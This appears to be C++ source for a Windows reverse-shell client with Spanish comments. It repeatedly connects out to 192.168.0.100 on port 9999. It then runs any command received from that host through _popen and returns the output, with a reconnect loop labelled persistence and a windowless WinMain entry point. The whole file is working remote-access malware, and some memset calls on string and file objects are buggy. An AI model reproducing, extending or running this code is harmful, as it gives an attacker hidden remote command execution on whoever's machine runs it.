#include <iostream>
#include <winsock2.h>
#include <string>
#include <windows.h>
#include <direct.h>
#include <stdio.h>
#include <stdlib.h>
#include <array>
#include <cstdlib>
#include <cstring>


#pragma comment(lib, "Ws2_32.lib")
#pragma warning(disable:4996) 
#pragma warning(disable:6031) 
#pragma warning(disable:4101)
#pragma warning(disable:4715)
#pragma warning(disable:26495)
#pragma warning(disable:28251)

using namespace std;
using std::cout;
using std::cin;
using std::endl;




class client {
private:
    WSADATA WSAData;
    SOCKET server;
    SOCKADDR_IN addr;
    char error1[1024] = "primer error";
    char error2[1024] = "usted no ha introducido un comando valido";
public:

    client() {
        WSAStartup(MAKEWORD(2, 0), &WSAData);
        server = socket(AF_INET, SOCK_STREAM, 0);
        addr.sin_addr.s_addr = inet_addr("192.168.0.100");
        addr.sin_family = AF_INET;
        addr.sin_port = htons(9999);
    }

    void reboot(void) {
        WSAStartup(MAKEWORD(2, 0), &WSAData);
        server = socket(AF_INET, SOCK_STREAM, 0);
        addr.sin_addr.s_addr = inet_addr("192.168.0.100");
        addr.sin_family = AF_INET;
        addr.sin_port = htons(9999);
    }

    int ups() {
        int a;
        a = -1;
        while (a == -1) {
            a = connect(server, (SOCKADDR*)&addr, sizeof(addr));
            if (a == 0) {
                return 0;
            }

        }

    }

    void persistence(void) {
        int b = 1;
        int ups = this->ups();

        while (true) {
            if (b != 1) {
                int ups = this->ups();
            }
            if (ups == 0) {
                memset(&ups, 0, sizeof(ups));
                int shell = this->shell(0);
                if (shell == 0) {
                    b += 1;
                    this->reboot();
                    memset(&shell, 0, sizeof(shell));
                }
            }
        }//fin del ciclo de persistencia

    }

    int shell(int status) {
        if (status == 0) {
            //get path
            char path[256];
            getcwd(path, sizeof(path));
            send(server, path, sizeof(path), 0);
            memset(path, 0, sizeof(path));
            //shell 
            int cont = 0;
            int stat = 0;
            while (true) {
                cont += 1;
                //get answare
                char serverMsg[1024];
                int a = recv(server, serverMsg, 1024, 0);

                //if cls or clear; send path
                char cl[] = "cls";
                char cls[] = "clear";
                if (strcmp(serverMsg, cls) == 0 || strcmp(serverMsg, cl) == 0) {
                    getcwd(path, 256);
                    send(server, path, sizeof(path), 0);
                    memset(path, 0, sizeof(path));
                    memset(cls, 0, sizeof(cls));
                    memset(cl, 0, sizeof(cl));
                    memset(&serverMsg, 0, sizeof(serverMsg));
                }
                else {
                    memset(cls, 0, sizeof(cls));
                    memset(cl, 0, sizeof(cl));
                }
                //if ans is "exit"
                char exl[] = "exit";
                if (strcmp(serverMsg, exl) == 0) {
                    closesocket(server);
                    WSACleanup();
                    memset(cls, 0, sizeof(cls));
                    memset(cl, 0, sizeof(cl));
                    memset(exl, 0, sizeof(exl));
                    break;
                }
                else {
                    memset(exl, 0, sizeof(exl));
                }
                //if ans is task

                char tas[] = "tasklist";
                char task[] = "task";
                if (strcmp(serverMsg, task) == 0) {
                    FILE* msg = _popen(tas, "r");
                    memset(tas, 0, sizeof(tas));
                    memset(task, 0, sizeof(task));
                    char buffer[1024];
                    buffer[0] = '\0';
                    string resultado = "";
                    while (!feof(msg))
                    {
                        if (fgets(buffer, 1024, msg) != NULL)
                        {
                            resultado += buffer;
                        }
                    }
                    _pclose(msg);
                    memset(msg, 0, sizeof(msg));
                    string as = resultado.c_str();

                    int lget = as.size();
                    if (lget == 0 && cont == 1) {
                        send(server, error1, 1024, 0);
                    }
                    if (lget == 0 && cont > 1) {
                        send(server, error2, 1024, 0);
                    }
                    if (cont > 1 && lget > 1) {
                        send(server, resultado.c_str(), lget, 0);
                        memset(&resultado, 0, sizeof(resultado));
                        memset(buffer, 0, sizeof(buffer));
                        memset(msg, 0, sizeof(msg));
                        memset(&lget, 0, sizeof(lget));
                        memset(&as, 0, sizeof(as));

                        memset(serverMsg, 0, sizeof(serverMsg));
                    }
                }


                //shell

                if (strcmp(serverMsg, exl) != 0 && strcmp(serverMsg, cls) != 0 && strcmp(serverMsg, cl) != 0 && strcmp(serverMsg, task) != 0) {
                    FILE* msg = _popen(serverMsg, "r");
                    memset(&serverMsg, 0, sizeof(serverMsg));
                    char buffer[1024];
                    string resultado = "";
                    while (!feof(msg))
                    {
                        if (fgets(buffer, 1024, msg) != NULL)
                        {
                            resultado += buffer;
                        }
                    }
                    _pclose(msg);
                    memset(msg, 0, sizeof(msg));
                    buffer[0] = '\0';
                    string as = resultado.c_str();

                    int lget = as.size();
                    if (lget == 0 && cont == 1) {
                        send(server, error1, 1024, 0);
                    }
                    if (lget == 0 && cont > 1) {
                        send(server, error2, 1024, 0);
                        memset(&lget, 0, sizeof(lget));
                    }
                    if (cont > 1 || lget > 0) {
                        send(server, resultado.c_str(), lget, 0);
                        cout << "status al recibir" << a << endl;
                        memset(&resultado, 0, sizeof(resultado));
                        memset(buffer, 0, sizeof(buffer));
                        memset(msg, 0, sizeof(msg));
                        memset(&lget, 0, sizeof(lget));
                        memset(&as, 0, sizeof(as));
                    }
                }

            }
            status = 1;
        }

        return 0;
    }
};


int WINAPI WinMain(HINSTANCE inst, HINSTANCE prev, LPSTR cmd, int show) {
    // program starts here 
    client* ob1 = new client();
    //inicio del ciclo 
    ob1->persistence();

    return 0;
}

int main() {
    // program starts here 
    client* ob1 = new client();
    //inicio del ciclo 
    ob1->persistence();

    return 0;
}

